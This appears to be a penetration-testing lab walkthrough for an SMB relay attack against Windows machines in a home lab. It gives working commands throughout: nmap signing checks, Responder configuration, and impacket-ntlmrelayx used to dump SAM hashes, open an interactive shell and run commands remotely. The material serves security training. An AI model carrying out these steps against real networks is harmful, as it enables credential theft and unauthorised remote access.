# VI. SMB Relay Attacks Lab

Make sure both Windows user machines are turned on.

In Kali, use the following command to run nmap with a script to check whether SMB signing is enabled or not:

```bash
nmap --script=smb2-security-mode.nse -p445 <WINDOWS IP> -Pn
```

`-Pn` is used to skip host discovery and treat all specified targets as online. This is useful when a normal nmap scan does not return any hosts.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap --script=smb2-security-mode.nse -p445 10.0.2.10 -Pn
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-17 07:38 EDT
Nmap scan report for 10.0.2.10
Host is up (0.00098s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds

┌──(kali㉿kali)-[~]
└─$ nmap --script=smb2-security-mode.nse -p445 10.0.2.11 -Pn   
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-17 07:37 EDT
Nmap scan report for 10.0.2.11
Host is up (0.00071s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
```

Open a text editor, enter IP of the `FRANKY` and `USOPP` User machines and save as `targets.txt`

Next edit the responder file using:

```bash
  sudo nano /etc/responder/Responder.conf
```

Make the following changes, `SMB = Off` , `HTTP = Off` and save.

![SMB 1.png](VI%20SMB%20Relay%20Attacks%20Lab%209ab2956e38114b0aa98f7038ae5afff4/SMB_1.png)

Run responder with `sudo responder -I eth0 -dwPv`. Notice that HTTP Server and SMB Server are both off.

![SMB 2.png](VI%20SMB%20Relay%20Attacks%20Lab%209ab2956e38114b0aa98f7038ae5afff4/SMB_2.png)

Open a new terminal tab and run `ntlmrelayx.py -tf targets.txt -smb2support`. If [pimpmykali](https://github.com/Dewalt-arch/pimpmykali) is not installed. Then ntlmrelay can be run with `impacket-ntlmrelayx` followed by the tags and conditions i.e `sudo impacket-ntlmrelayx -tf targets.txt -smb2support`. Leave it running.

Login to the windows machine that has a single local administrator, login using those credentials and trigger an event like last time. Open explorer and enter the attacker machine (Kali) IP address in the search bar.

Finally, back in the ntlmrelay terminal, the SAM hashes for the Admin and Local admin accounts will be dumped. It’s a good idea to save these in a text file for later.

![SMB 3.png](VI%20SMB%20Relay%20Attacks%20Lab%209ab2956e38114b0aa98f7038ae5afff4/SMB_3.png)

There’s also the option of using the  `-i` tag to spawn an interactive shell when an event is triggered i.e `sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i`

Copy the IP and port number of the windows machine and use them to start a netcat listener to spawn a shell.

```bash
┌──(kali㉿kali)-[~]
└─$ nc 127.0.0.1 11000
Type help for list of commands
# shares
ADMIN$
C$
IPC$
```

Another way to utilize this tool to run and execute commands with a relay attack. 

e.g `sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"` .

This is just a simple example, but this can be used to execute more malicious commands if need be.